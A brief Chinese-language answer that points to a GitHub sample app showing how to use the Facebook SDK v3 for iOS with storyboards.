我们在 GitHub 中有一个适用于 iOS 版 Facebook SDK v3 的示例应用程序：[https](https://github.com/fbsamples/ios-social-cafe) ://github.com/fbsamples/ios-social-cafe - 这演示了如何将 Facebook SDK 与故事板结合使用。

（PS：很简单）